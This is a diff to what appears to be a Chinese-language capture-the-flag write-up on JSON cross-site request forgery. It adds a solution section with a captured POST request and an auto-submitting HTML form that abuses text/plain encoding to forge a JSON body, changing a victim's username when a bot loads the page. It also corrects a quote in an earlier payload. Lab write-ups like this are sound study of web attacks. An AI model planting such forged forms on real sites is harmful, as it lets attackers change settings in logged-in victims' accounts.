@@ -129,7 +129,7 @@ echo file_get_contents('php://input');
 <html>
     <body>
         <form id="form" method="post" enctype="text/plain" action="http://192.168.1.82:1234/2.php">
-            <input name='{"foo":"' value='bar}"'}>
+            <input name='{"foo":"' value='bar"}'}>
             <input type="submit" value="Click me">
         </form>
         <script>
@@ -151,10 +151,49 @@ array(1) {
 ```
 
 
-# 
+## 题解
 
+changeapi.php 的数据包如下所示
+```html
+POST /changeapi.php HTTP/1.1
+Host: 124.71.205.122:10002
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Content-Type: application/json; charset=utf-8
+Referer: http://124.71.205.122:10002/change.php
+Content-Length: 18
+Cookie: PHPSESSID=3f8dfdb8523b8a07b85e1dfac7a8292c
+Connection: close
+
+{"username":"123"}
+```
+根据数据包来修改网站 A（提前申请账号 =1234）
+```html
+<html>
+    <body>
+        <form id="form" method="post" enctype="text/plain" action="http://124.71.205.122:10002/changeapi.php">
+            <input name='{"username":"' value='1234"}'}>
+            <input type="submit" value="Click me">
+        </form>
+        <script>
+            window.onload = () => { 
+                console.log("1.php"); 
+                form.submit();
+            }
+        </script>
+    </body>
+</html>
+```
+将 html 放到对象存储中，然后让 bot 访问。效果如下所示
+
+![](./images/9.jpg)
 
 # 进一步探索
+
+这种漏洞虽然很简单，但应该非常常见，周末尝试继续探索。
 
 
 参考文章：
